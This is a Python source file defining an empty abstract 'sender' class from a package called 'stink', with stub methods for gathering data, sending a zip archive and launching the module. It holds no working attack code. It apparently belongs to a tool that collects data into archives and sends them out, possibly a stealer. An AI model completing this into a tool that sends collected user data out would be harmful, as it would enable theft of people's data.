from abc import abstractmethod
from typing import Tuple, Union

from stink.helpers.config import SenderConfig


class AbstractSender:
    """
    Template for the sender.
    """
    def __init__(self):
        self._config = SenderConfig()

    @abstractmethod
    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.
        :return: (str|bytes, ...)
        """
        ...

    @abstractmethod
    def __send_archive(self) -> None:
        """
        Sends the data.
        :return: None
        """
        ...

    @abstractmethod
    def run(self, zip_name: str, storage_path: str, errors: bool) -> None:
        """
        Launches the sender module.
        :param zip_name: str
        :param storage_path: str
        :param errors: bool
        :return: None
        """
        ...
